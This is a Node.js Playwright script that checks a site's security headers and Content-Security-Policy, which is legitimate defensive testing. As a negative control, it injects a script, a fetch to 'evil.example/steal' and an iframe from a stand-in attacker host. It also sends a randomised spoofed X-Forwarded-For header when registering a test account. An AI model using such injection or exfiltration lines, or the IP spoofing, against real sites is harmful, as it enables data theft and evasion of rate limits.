/**
 * Checks the deployed security headers and Content-Security-Policy in a real
 * browser. Run it against a running site and API:
 *
 *   CHECK_SITE=http://localhost:3000 CHECK_API=http://localhost:5000/api \
 *     node scripts/check-csp.mjs
 *
 * Optional: CHECK_ADMIN_EMAIL / CHECK_ADMIN_PASSWORD also walks the admin panel.
 *
 * It needs Playwright with a Chromium install (not a project dependency, so this
 * is a manual check, not part of CI). It fails (exit 1) if any page:
 *   - triggers a Content-Security-Policy violation,
 *   - throws an uncaught error or fails to load a request,
 *   - is missing an expected security header,
 * and it includes a NEGATIVE CONTROL: it injects a script and a connection to a
 * foreign origin and requires the browser to block both. Without that control a
 * policy that blocks nothing would pass.
 */
import { createRequire } from "node:module";
const require = createRequire(import.meta.url);
const { chromium } = require("playwright");

const SITE = (process.env.CHECK_SITE || "http://localhost:3000").replace(/\/$/, "");
const API = (process.env.CHECK_API || "http://localhost:5000/api").replace(/\/$/, "");
const ADMIN = { email: process.env.CHECK_ADMIN_EMAIL, password: process.env.CHECK_ADMIN_PASSWORD };

const failures = [];
const fail = (message) => {
  failures.push(message);
  console.log(`  FAIL ${message}`);
};
const ok = (message) => console.log(`  ok   ${message}`);

const PUBLIC_PAGES = ["/", "/login", "/signup", "/forgot-password", "/opportunities", "/marketplace", "/learning", "/community", "/services", "/business-ads"];
const SIGNED_IN_PAGES = ["/dashboard", "/settings", "/profile", "/opportunities", "/marketplace", "/learning", "/community", "/services"];
const ADMIN_TABS = ["Overview", "Advertisements", "Opportunities", "Courses", "Services", "Community", "Accounts", "Activity"];

const REQUIRED_HEADERS = {
  "content-security-policy": [/default-src 'self'/, /frame-ancestors 'none'/, /object-src 'none'/, /base-uri 'self'/],
  "x-content-type-options": [/^nosniff$/],
  "x-frame-options": [/^DENY$/],
  "referrer-policy": [/strict-origin-when-cross-origin/],
  "permissions-policy": [/camera=\(\)/, /microphone=\(\)/],
  "cross-origin-opener-policy": [/same-origin/]
};

async function newTrackedPage(context) {
  const page = await context.newPage();
  const seen = { csp: [], failed: [], errors: [], consoleCsp: [] };
  await page.addInitScript(() => {
    window.__csp = [];
    document.addEventListener("securitypolicyviolation", (event) => {
      window.__csp.push(`${event.violatedDirective} blocked ${event.blockedURI || "inline"}`);
    });
  });
  page.on("console", (message) => {
    if (message.type() === "error" && /Content Security Policy/i.test(message.text())) seen.consoleCsp.push(message.text().slice(0, 200));
  });
  page.on("pageerror", (error) => seen.errors.push(error.message.slice(0, 200)));
  page.on("requestfailed", (request) => {
    const reason = request.failure()?.errorText || "";
    if (!/ERR_ABORTED/.test(reason)) seen.failed.push(`${request.url()} (${reason})`);
  });
  return { page, seen };
}

async function visit(page, seen, path, label = path) {
  const response = await page.goto(`${SITE}${path}`, { waitUntil: "domcontentloaded", timeout: 30000 });
  await page.waitForLoadState("networkidle", { timeout: 15000 }).catch(() => {});
  // A page that rendered nothing would pass every other check.
  const text = (await page.locator("body").innerText().catch(() => "")).trim();
  if (text.length < 20) fail(`${label}: the page rendered almost nothing`);

  const headers = response.headers();
  for (const [name, patterns] of Object.entries(REQUIRED_HEADERS)) {
    for (const pattern of patterns) if (!(headers[name] && pattern.test(headers[name]))) fail(`${label}: header ${name} does not match ${pattern}`);
  }
  if (headers["x-powered-by"]) fail(`${label}: X-Powered-By is still sent`);
  return page;
}

async function collect(page, seen, label) {
  const violations = [...seen.csp, ...(await page.evaluate(() => window.__csp || []))];
  const problems = [...violations, ...seen.consoleCsp];
  if (problems.length) problems.forEach((p) => fail(`${label}: CSP violation: ${p}`));
  seen.errors.forEach((e) => fail(`${label}: uncaught error: ${e}`));
  seen.failed.forEach((f) => fail(`${label}: request failed: ${f}`));
  if (!problems.length && !seen.errors.length && !seen.failed.length) ok(label);
  seen.csp.length = seen.consoleCsp.length = seen.errors.length = seen.failed.length = 0;
}

async function uiLogin(page, seen, email, password) {
  await visit(page, seen, "/login", "/login (form)");
  await page.locator('input[type="email"], input[name="email"]').first().fill(email);
  await page.locator('input[type="password"]').first().fill(password);
  await page.locator('button[type="submit"]').first().click();
  await page.waitForURL((url) => !url.pathname.startsWith("/login"), { timeout: 20000 });
  await page.waitForLoadState("networkidle", { timeout: 15000 }).catch(() => {});
}

async function main() {
  console.log(`Checking ${SITE} (API ${API})\n`);
  const browser = await chromium.launch();
  try {
    // ---------------------------------------------------------------- public
    console.log("Public pages");
    const anon = await browser.newContext();
    const { page: p1, seen: s1 } = await newTrackedPage(anon);
    for (const path of PUBLIC_PAGES) {
      await visit(p1, s1, path);
      await collect(p1, s1, path);
    }

    // -------------------------------------------------- negative control
    console.log("\nNegative control (the policy must actually block things)");
    await visit(p1, s1, "/", "/ (control)");
    const control = await p1.evaluate(async () => {
      const result = { scriptBlocked: false, fetchBlocked: false, frameBlocked: false };
      const script = document.createElement("script");
      script.src = "https://evil.example/attack.js";
      document.head.appendChild(script);
      try {
        await fetch("https://evil.example/steal", { mode: "no-cors" });
      } catch {
        result.fetchBlocked = true;
      }
      const frame = document.createElement("iframe");
      frame.src = "https://evil.example/";
      document.body.appendChild(frame);
      await new Promise((resolve) => setTimeout(resolve, 600));
      const events = window.__csp || [];
      result.scriptBlocked = events.some((e) => /script-src/.test(e) && /evil\.example/.test(e));
      result.frameBlocked = events.some((e) => /(frame-src|default-src|child-src)/.test(e) && /evil\.example/.test(e));
      return result;
    });
    control.scriptBlocked ? ok("a script from another origin is blocked") : fail("a script from another origin was NOT blocked");
    control.fetchBlocked ? ok("a connection to another origin is blocked") : fail("a connection to another origin was NOT blocked");
    control.frameBlocked ? ok("a frame from another origin is blocked") : fail("a frame from another origin was NOT blocked");
    s1.csp.length = s1.consoleCsp.length = s1.failed.length = 0; // the control caused these on purpose
    await anon.close();

    // ------------------------------------------------------------ signed in
    console.log("\nSigned-in pages (real login through the form)");
    const email = `csp-check-${Date.now()}@example.com`;
    const password = "csp-check-pass-1";
    const registered = await fetch(`${API}/auth/register`, {
      method: "POST",
      headers: { "Content-Type": "application/json", "X-Forwarded-For": `10.77.${Math.floor(Math.random() * 250)}.${Math.floor(Math.random() * 250)}` },
      body: JSON.stringify({ name: "CSP Check", email, password, role: "student" })
    });
    if (!registered.ok) {
      fail(`could not create a test account (${registered.status}); is the API reachable at ${API}?`);
    } else {
      const user = await browser.newContext();
      const { page, seen } = await newTrackedPage(user);
      await uiLogin(page, seen, email, password);
      await collect(page, seen, "login, then landing page");
      for (const path of SIGNED_IN_PAGES) {
        await visit(page, seen, path);
        await collect(page, seen, `${path} (signed in)`);
      }
      await user.close();
    }

    // --------------------------------------------------------------- admin
    if (ADMIN.email && ADMIN.password) {
      console.log("\nAdmin panel");
      const adminCtx = await browser.newContext();
      const { page, seen } = await newTrackedPage(adminCtx);
      await uiLogin(page, seen, ADMIN.email, ADMIN.password);
      await visit(page, seen, "/admin");
      for (const tab of ADMIN_TABS) {
        await page.getByRole("tab", { name: new RegExp(`^${tab}`) }).click();
        await page.waitForLoadState("networkidle", { timeout: 15000 }).catch(() => {});
        await collect(page, seen, `admin: ${tab}`);
      }
      await adminCtx.close();
    }
  } finally {
    await browser.close();
  }

  console.log(failures.length ? `\n${failures.length} problem(s) found.` : "\nAll checks passed.");
  process.exit(failures.length ? 1 : 0);
}

main().catch((error) => {
  console.error("The check itself failed to run:", error.message);
  process.exit(2);
});
